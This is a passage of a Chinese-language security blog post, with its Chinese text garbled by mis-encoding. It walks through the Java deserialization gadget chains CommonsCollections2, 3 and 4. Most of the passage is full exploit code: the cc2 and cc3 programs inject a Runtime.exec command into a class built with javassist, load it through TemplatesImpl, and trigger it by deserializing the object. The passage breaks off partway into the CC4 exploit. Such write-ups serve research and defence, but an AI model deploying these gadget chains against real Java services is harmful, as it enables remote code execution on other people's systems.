class="comment">// åˆ›å»º static ä»£ç å—ï¼Œå¹¶æ’å…¥ä»£ç </span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String ClassName = <span class="string">"byc404"</span>;</span><br><span class="line">        cc.setName(ClassName);</span><br><span class="line">        <span class="comment">// å†™å…¥.class æ–‡ä»¶</span></span><br><span class="line">        cc.writeFile();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            createPseson();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/38.PNG" class="lazyload" data-srcset="38.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>åƒè¿™æ ·èƒ½å¤Ÿç›´æ¥æ§åˆ¶staticæ–¹æ³•çš„è¯,é‚£ä¹ˆå®ƒåœ¨å®ä¾‹åŒ–æ—¶å°±ä¼šè¢«ç›´æ¥æ‰§è¡Œã€‚</p><p>æ¥ä¸‹æ¥çœ‹çœ‹å®ƒçœŸæ­£çš„æ ¸å¿ƒTemplatesImplçš„ä½¿ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›getTransletInstance</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒdefineTransletClasses()å¯ä»¥è¿˜åŸbytecodeä¸ºclass.åé¢çš„newInstance()åˆ™å¯ä»¥å®ä¾‹åŒ–è¿™ä¸ªclass.åœ¨è¿™ä¸ªå®ä¾‹åŒ–çš„è¿‡ç¨‹ä¸­staticæ–¹æ³•å°±ä¼šæ‰§è¡Œã€‚æ‰€ä»¥è¾¾æˆäº†ä¸€ä¸ªä»»æ„å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚</p><p>å†ç¨å¾®å¤šå›é¡¾ä¸‹å‰é¢æˆ‘ä»¬è¾¾åˆ°çš„è¿›åº¦ï¼Œå°±æ˜¯æˆ‘ä»¬å·²ç»å¯ä»¥ä»»æ„è°ƒç”¨transformäº†,åªéœ€ä¸€ä¸ªå¯æ§å¯¹è±¡ã€‚é‚£ä¹ˆè¿™é‡Œå†ç”¨ä¹‹å‰ç»å¸¸ç”¨åˆ°çš„InvokerTransformer.transformåå°„æ¥è°ƒç”¨TemplatesImpl.newtransformer</p><p>æœ€ç»ˆexp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">"org.apache.commons.collections4.functors.InvokerTransformer"</span>).getDeclaredConstructor(String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(<span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"byc"</span>);</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line"></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"byc404"</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>; </span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCodes);</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"name"</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_class"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queue_array = <span class="keyword">new</span> Object[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">        Field queue_field = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        queue_field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        queue_field.set(queue,queue_array);</span><br><span class="line"></span><br><span class="line">        Field size = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"size"</span>);</span><br><span class="line">        size.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        size.set(queue,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field comparator_field = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        comparator_field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        comparator_field.set(queue,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./cc2"</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./cc2"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªexpå‡ ä¸ªç»†èŠ‚è¿˜æ˜¯å€¼å¾—è¯´æ˜ä¸€ä¸‹çš„ã€‚ä¸è¿‡æˆ‘è¿˜æ˜¯å·æ‡’ä¸‹ä¸æ·±å…¥äº†ï¼Œå°±å½“åšä¸€äº›æ³¨æ„äº‹é¡¹ç®€å•è¯´æ˜ä¸‹ã€‚</p><p>1.ä¸ºäº†è¿›å…¥<code>defineTransletClasses</code>éœ€è¦æŠŠæ¶æ„ç±»çš„çˆ¶ç±»è®¾ç½®ä¸ºAbstractTransletã€‚å¦åˆ™_transletIndexä¼šå°äº0çˆ†å‡ºé”™è¯¯ã€‚<br>2.é€šè¿‡åå°„çš„æ–¹å¼æ¥è®¾ç½®queueçš„å€¼ï¼Œè€Œæ˜¯ç›´æ¥addã€‚è¿™é‡Œæˆ‘ä»¬queueçš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯templateså³TemplatesImpl.class.newInstance();ã€‚è¿™æ˜¯ä¸€ä¸ªç±»ã€‚è€Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯1.è¿™ä¸¤ä¸ªå…ƒç´ åœ¨addæ—¶ä¼šå‡ºç°æ¯”è¾ƒå‡ºé”™ã€‚æ‰€ä»¥å¾—ä¿è¯ç±»å‹ä¸€è‡´ã€‚ä¸è¿‡è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•å°±æ˜¯é‡Œé¢æ”¾ä¸¤ä¸ªä¸€æ ·çš„å…ƒç´ å³éƒ½ä¸ºtemplate.</p><ul><li>CommonsCollections3</li></ul><p>CC3åˆå›åˆ°äº†CommonsCollections3.1çš„ä¾èµ–ã€‚<br>æœ‰ç‚¹åƒCC1+CC2ã€‚ç”¨åˆ°äº†ä¸¤ä¸ªé“¾å­çš„å…³é”®å†…å®¹ã€‚</p><p>åŒºåˆ«åœ¨äºç”¨äº†TrAXFilterè°ƒç”¨newTransformer()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">        TransformerConfigurationException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">        _transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(_transformer);</span><br><span class="line">        _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç„¶åä¸åŒäºä»¥å¤–çš„InvokeTransformer,å®ƒæ”¹ç”¨äº†InstantiateTransformer.å…¶transformæ–¹æ³•å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InstantiateTransformer: Input object was not an instanceof Class, it was a "</span> + (input == <span class="keyword">null</span> ? <span class="string">"null object"</span> : input.getClass().getName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Constructor con = ((Class)input).getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ›å»ºäº†ç±»å®ä¾‹ï¼Œå¦‚æœæŠŠinputè®¾ç½®ä¸ºTrAXFilter,é‚£ä¹ˆå°±ä¼šåœ¨è¿™é‡Œå®ä¾‹åŒ–çš„æ—¶å€™è°ƒç”¨å…¶æ„é€ æ–¹æ³•ï¼Œè§¦å‘TemplatesImpl#newTransformerã€‚</p><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc3</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"byc"</span>);</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line"></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"byc404"</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCodes);</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"name"</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_class"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor handler_constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Deprecated<span class="class">.<span class="keyword">class</span>,<span class="title">map</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Map<span class="class">.<span class="keyword">class</span>&#125;,<span class="title">map_handler</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Constructor AnnotationInvocationHandler_Constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        AnnotationInvocationHandler_Constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Deprecated<span class="class">.<span class="keyword">class</span>,<span class="title">proxy_map</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./cc3"</span>));</span><br><span class="line">            outputStream.writeObject(handler);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./cc3"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>CommonsCollections4</li></ul><p>ä¾èµ–ç¯å¢ƒå˜ä¸ºCommons Collections 4.0</p><p>ä¼¼ä¹å°±æ˜¯ä¸ªæ‚äº¤â€¦â€¦å› ä¸ºä¾èµ–å˜ä¸º4.0äº†ã€‚ç›´æ¥ä½¿ç”¨CC2 ä¸­çš„queue+ CC3ä¸­çš„transformè°ƒç”¨ã€‚</p><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 